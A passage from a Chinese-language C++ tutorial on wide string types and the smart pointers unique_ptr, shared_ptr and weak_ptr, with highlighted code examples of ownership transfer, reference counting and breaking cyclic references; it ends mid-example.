<strong><code>std::u32string</code> (C++11):</strong> <code>basic_string&lt;char32_t&gt;</code> 的别名，用于处理 UTF-32 编码的字符串。</li></ul><p>这些宽字符串类具有与 <code>std::string</code> 类似的操作接口，但处理的字符类型不同。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">wstring</span> wide_str = <span class="string">L&quot;Wide String Example&quot;</span>; <span class="comment">// L 前缀表示宽字符字面量</span></span><br><span class="line">    <span class="built_in">std</span>::u16string utf16_str = <span class="string">u&quot;UTF-16 String&quot;</span>; <span class="comment">// u 前缀</span></span><br><span class="line">    <span class="built_in">std</span>::u32string utf32_str = <span class="string">U&quot;UTF-32 String&quot;</span>; <span class="comment">// U 前缀</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::wcout 用于输出宽字符串</span></span><br><span class="line">    <span class="built_in">std</span>::wcout &lt;&lt; <span class="string">L&quot;Wide: &quot;</span> &lt;&lt; wide_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出 UTF-16/32 字符串通常需要特定的库或转换</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; utf16_str &lt;&lt; std::endl; // 可能无法正确显示</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择哪种字符串类型取决于你的应用场景和需要处理的字符集。在现代 C++ 中，如果需要处理 Unicode，通常推荐使用 UTF-8 编码的 <code>std::string</code>，并配合相应的 Unicode 处理库。</p><h2 id="16-2-智能指针模板类"><a href="#16-2-智能指针模板类" class="headerlink" title="16.2 智能指针模板类"></a>16.2 智能指针模板类</h2><p>在 C++ 中，使用 <code>new</code> 分配动态内存后，必须使用 <code>delete</code> 来释放它，否则会导致**内存泄漏 (Memory Leak)**。手动管理内存容易出错，尤其是在复杂的代码路径、异常处理或资源共享的情况下。忘记 <code>delete</code>、重复 <code>delete</code> 或使用悬挂指针（指向已释放内存的指针）都是常见的错误来源。</p><p>为了解决这个问题，C++ 标准库（在 <code>&lt;memory&gt;</code> 头文件中）提供了一系列<strong>智能指针 (Smart Pointers)</strong> 模板类。智能指针是行为类似于指针的类对象，但它们能<strong>自动管理</strong>所指向的动态分配的内存。当智能指针本身离开作用域（例如函数结束、对象销毁）或被重新赋值时，它会自动调用 <code>delete</code>（或自定义的删除器）来释放其管理的内存。这极大地简化了动态内存管理，提高了程序的健壮性，并有助于实现 RAII（资源获取即初始化）。</p><p>C++11 引入了三种主要的智能指针类型：</p><ol><li> <strong><code>std::unique_ptr&lt;T&gt;</code>:</strong> 实现<strong>独占所有权 (Exclusive Ownership)</strong> 或严格所有权模型。在任何时候，只有一个 <code>unique_ptr</code> 可以指向给定的资源。当 <code>unique_ptr</code> 被销毁或重置时，资源被释放。它<strong>不能被复制</strong>，但可以被**移动 (Moved)**。</li><li> <strong><code>std::shared_ptr&lt;T&gt;</code>:</strong> 实现<strong>共享所有权 (Shared Ownership)</strong> 模型。允许多个 <code>shared_ptr</code> 指向同一个资源。内部维护一个**引用计数 (Reference Count)**，记录有多少个 <code>shared_ptr</code> 指向该资源。只有当最后一个指向资源的 <code>shared_ptr</code> 被销毁或重置时，资源才会被释放。</li><li> <strong><code>std::weak_ptr&lt;T&gt;</code>:</strong> 是一种<strong>非拥有 (Non-owning)</strong> 的智能指针，它指向由 <code>shared_ptr</code> 管理的资源，但<strong>不增加</strong>引用计数。它主要用于解决 <code>shared_ptr</code> 可能遇到的<strong>循环引用 (Cyclic Reference)</strong> 问题，并用于观察资源是否存在。</li></ol><h3 id="16-2-1-使用智能指针"><a href="#16-2-1-使用智能指针" class="headerlink" title="16.2.1 使用智能指针"></a>16.2.1 使用智能指针</h3><h4 id="std-unique-ptr"><a href="#std-unique-ptr" class="headerlink" title="std::unique_ptr"></a><code>std::unique_ptr</code></h4><p><code>unique_ptr</code> 是轻量级的智能指针，开销几乎与原始指针相同。它是管理动态分配资源的<strong>首选</strong>方式，除非你需要共享所有权。</p><p><strong>创建:</strong></p><ul><li><strong>推荐方式 (C++14 及以后):</strong> 使用 <code>std::make_unique&lt;T&gt;(args...)</code>。它更安全（避免了某些异常安全问题）且可能更高效。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建指向 int 的 unique_ptr</span></span><br><span class="line"><span class="keyword">auto</span> uptr_int = <span class="built_in">std</span>::make_unique&lt;<span class="keyword">int</span>&gt;(<span class="number">10</span>); <span class="comment">// 指向值为 10 的 int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建指向 string 的 unique_ptr</span></span><br><span class="line"><span class="keyword">auto</span> uptr_str = <span class="built_in">std</span>::make_unique&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(<span class="string">&quot;Hello&quot;</span>); <span class="comment">// 指向 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>C++11 方式:</strong> 直接使用 <code>new</code>。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; <span class="title">uptr_int_cpp11</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">20</span>))</span></span>;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="title">uptr_str_cpp11</span><span class="params">(<span class="keyword">new</span> <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">&quot;World&quot;</span>))</span></span>;</span><br></pre></td></tr></table></figure></li></ul><p><strong>所有权转移 (移动):</strong> <code>unique_ptr</code> 不能复制，但可以通过 <code>std::move()</code> 转移所有权。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; ptr1 = <span class="built_in">std</span>::make_unique&lt;<span class="keyword">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line"><span class="comment">// std::unique_ptr&lt;int&gt; ptr2 = ptr1; // 错误！不能复制</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; ptr3 = <span class="built_in">std</span>::move(ptr1); <span class="comment">// OK！所有权从 ptr1 转移到 ptr3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时 ptr1 变为 nullptr</span></span><br><span class="line"><span class="keyword">if</span> (!ptr1) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ptr1 is now null.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ptr3) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ptr3 holds the value: &quot;</span> &lt;&lt; *ptr3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数可以返回 <code>unique_ptr</code>，这会自动触发移动语义，将所有权转移给调用者。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="title">create_string</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::make_unique&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(<span class="string">&quot;Created String&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; owned_ptr = create_string(); <span class="comment">// 所有权转移给 owned_ptr</span></span><br></pre></td></tr></table></figure><p><strong>使用:</strong> 像普通指针一样使用 <code>*</code> 和 <code>-&gt;</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; uptr = <span class="built_in">std</span>::make_unique&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; *uptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; uptr-&gt;length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><p><strong>其他操作:</strong></p><ul><li>  <code>get()</code>: 返回指向被管理对象的原始指针（但不转移所有权）。小心使用，避免手动 <code>delete</code> 这个指针。</li><li>  <code>reset(p)</code>: 销毁当前管理的对象（如果有），并接管指针 <code>p</code> 指向的新对象。</li><li>  <code>reset()</code>: 销毁当前管理的对象，并将 <code>unique_ptr</code> 置为空。</li><li>  <code>release()</code>: 放弃对指针的所有权，返回原始指针，并将 <code>unique_ptr</code> 置为空。调用者<strong>负责</strong>手动 <code>delete</code> 返回的指针。</li></ul><p><strong>用于数组:</strong> <code>unique_ptr</code> 可以管理动态分配的数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建指向包含 5 个 int 的数组的 unique_ptr</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>[]&gt; uptr_arr = <span class="built_in">std</span>::make_unique&lt;<span class="keyword">int</span>[]&gt;(<span class="number">5</span>); <span class="comment">// C++14</span></span><br><span class="line"><span class="comment">// 或者 std::unique_ptr&lt;int[]&gt; uptr_arr_cpp11(new int[5]); // C++11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 operator[] 访问元素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) &#123;</span><br><span class="line">    uptr_arr[i] = i * <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; uptr_arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">// 离开作用域时，会自动调用 delete[]</span></span><br></pre></td></tr></table></figure><p><strong>自定义删除器:</strong> 可以为 <code>unique_ptr</code> 指定自定义的删除器，用于执行非标准的资源释放操作（如关闭文件句柄）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; // for FILE, fopen, fclose</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FileCloser</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(FILE* fp)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">            <span class="built_in">std</span>::fclose(fp);</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File closed.\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用自定义删除器 FileCloser</span></span><br><span class="line">    std::unique_ptr&lt;FILE, FileCloser&gt; file_ptr(std::fopen(&quot;test.txt&quot;, &quot;w&quot;));</span><br><span class="line">    <span class="keyword">if</span> (file_ptr) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">fprintf</span>(file_ptr.get(), <span class="string">&quot;Hello from unique_ptr with custom deleter.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当 file_ptr 离开作用域时，FileCloser::operator() 会被调用以关闭文件</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="std-shared-ptr"><a href="#std-shared-ptr" class="headerlink" title="std::shared_ptr"></a><code>std::shared_ptr</code></h4><p><code>shared_ptr</code> 用于资源可能被多个指针共享所有权的场景。</p><p><strong>创建:</strong></p><ul><li><strong>推荐方式:</strong> 使用 <code>std::make_shared&lt;T&gt;(args...)</code>。它通常更高效，因为它可以在一次内存分配中同时为对象和引用计数控制块分配内存。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> sptr_int = <span class="built_in">std</span>::make_shared&lt;<span class="keyword">int</span>&gt;(<span class="number">50</span>);</span><br><span class="line"><span class="keyword">auto</span> sptr_str = <span class="built_in">std</span>::make_shared&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(<span class="string">&quot;Shared&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>new</code>:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sptr_int_new</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">60</span>))</span></span>;</span><br><span class="line"><span class="comment">// 注意：不要将同一个原始指针用于初始化多个 shared_ptr，应通过复制已有的 shared_ptr 来共享</span></span><br><span class="line"><span class="comment">// int* raw_ptr = new int(70);</span></span><br><span class="line"><span class="comment">// std::shared_ptr&lt;int&gt; sp1(raw_ptr);</span></span><br><span class="line"><span class="comment">// std::shared_ptr&lt;int&gt; sp2(raw_ptr); // 错误！会导致重复 delete</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>共享所有权和引用计数:</strong> 复制 <code>shared_ptr</code> 会增加引用计数，销毁或重置 <code>shared_ptr</code> 会减少引用计数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; sp1 = <span class="built_in">std</span>::make_shared&lt;<span class="keyword">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp1 use_count: &quot;</span> &lt;&lt; sp1.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; sp2 = sp1; <span class="comment">// 复制，引用计数增加</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp1 use_count: &quot;</span> &lt;&lt; sp1.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp2 use_count: &quot;</span> &lt;&lt; sp2.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line">sp1.reset(); <span class="comment">// sp1 不再指向对象，引用计数减少</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp1 reset. sp2 use_count: &quot;</span> &lt;&lt; sp2.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当 sp2 离开作用域时，引用计数变为 0，对象被删除</span></span><br></pre></td></tr></table></figure><p><strong>使用:</strong> 与 <code>unique_ptr</code> 类似，使用 <code>*</code> 和 <code>-&gt;</code>。</p><p><strong>其他操作:</strong></p><ul><li>  <code>get()</code>: 返回原始指针。</li><li>  <code>reset()</code> / <code>reset(p)</code>: 减少当前对象的引用计数（如果为 0 则删除），并可选地接管新指针 <code>p</code>。</li><li>  <code>use_count()</code>: 返回当前的引用计数值（主要用于调试）。</li></ul><p><strong>循环引用问题:</strong> 如果两个对象通过 <code>shared_ptr</code> 相互引用，它们的引用计数永远不会变为 0，即使没有外部指针指向它们，也会导致内存泄漏。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeB</span>;</span> <span class="comment">// 前向声明</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeA</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeB&gt; ptrB;</span><br><span class="line">    ~NodeA() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NodeA destroyed\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeB</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeA&gt; ptrA;</span><br><span class="line">    ~NodeB() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NodeB destroyed\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeA&gt; pa = <span class="built_in">std</span>::make_shared&lt;NodeA&gt;();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeB&gt; pb = <span class="built_in">std</span>::make_shared&lt;NodeB&gt;();</span><br><span class="line"></span><br><span class="line">    pa-&gt;ptrB = pb; <span class="comment">// pa 指向 pb</span></span><br><span class="line">    pb-&gt;ptrA = pa; <span class="comment">// pb 指向 pa (形成循环引用)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pa use_count: &quot;</span> &lt;&lt; pa.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2 (pa 和 pb-&gt;ptrA)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pb use_count: &quot;</span> &lt;&lt; pb.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2 (pb 和 pa-&gt;ptrB)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当 pa 和 pb 离开作用域时，引用计数都只减到 1，析构函数不会被调用，内存泄漏！</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解决方案:</strong> 使用 <code>std::weak_ptr</code> 打破循环。</p><h4 id="std-weak-ptr"><a href="#std-weak-ptr" class="headerlink" title="std::weak_ptr"></a><code>std::weak_ptr</code></h4><p><code>weak_ptr</code> 用于“观察”由 <code>shared_ptr</code> 管理的对象，但它本身不拥有对象，也不影响对象的生命周期（不改变引用计数）。</p><p><strong>创建:</strong> 只能从 <code>shared_ptr</code> 或另一个 <code>weak_ptr</code> 创建。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; sp = <span class="built_in">std</span>::make_shared&lt;<span class="keyword">int</span>&gt;(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">std</span>::weak_ptr&lt;<span class="keyword">int</span>&gt; wp = sp; <span class="comment">// wp 观察 sp 管理的对象</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sp use_count: &quot;</span> &lt;&lt; sp.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;wp use_count: &quot;</span> &lt;&lt; wp.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1 (weak_ptr::use_count 返回的是 shared_ptr 的计数)</span></span><br></pre></td></tr></table></figure><p><strong>使用:</strong></p><ul><li>  <code>expired()</code>: 检查所观察的对象是否已被销毁（对应的 <code>shared_ptr</code> 引用计数是否为 0）。</li><li><code>lock()</code>: <strong>关键方法</strong>。尝试获取一个指向所观察对象的 <code>shared_ptr</code>。<ul><li>  如果对象仍然存在，返回一个有效的 <code>shared_ptr</code>（并增加引用计数）。</li><li>如果对象已被销毁，返回一个空的 <code>shared_ptr</code>。<br>这是访问 <code>weak_ptr</code> 指向对象的<strong>安全</strong>方式。</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (wp.expired()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Object observed by wp is expired.\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; locked_sp = wp.lock(); <span class="comment">// 尝试获取 shared_ptr</span></span><br><span class="line">    <span class="keyword">if</span> (locked_sp) &#123; <span class="comment">// 检查是否成功获取</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Object still alive. Value: &quot;</span> &lt;&lt; *locked_sp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;use_count after lock: &quot;</span> &lt;&lt; locked_sp.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 引用计数增加</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Object expired between check and lock.\n&quot;</span>; <span class="comment">// 可能发生 (多线程)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// locked_sp 离开作用域，引用计数减少</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sp.reset(); <span class="comment">// 原始 shared_ptr 释放对象</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original shared_ptr reset.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; locked_sp_after_reset = wp.lock();</span><br><span class="line"><span class="keyword">if</span> (!locked_sp_after_reset) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;weak_ptr lock() failed after object destruction.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解决循环引用:</strong> 在循环引用的场景中，让其中一个指针（或两个）成为 <code>weak_ptr</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeB_weak</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeA_weak</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeB_weak&gt; ptrB; <span class="comment">// NodeA 强引用 NodeB</span></span><br><span class="line">    ~NodeA_weak() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NodeA_weak destroyed\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeB_weak</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::weak_ptr&lt;NodeA_weak&gt; ptrA; <span class="comment">// NodeB 弱引用 NodeA (打破循环)</span></span><br><span class="line">    ~NodeB_weak() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NodeB_weak destroyed\n&quot;</span>; 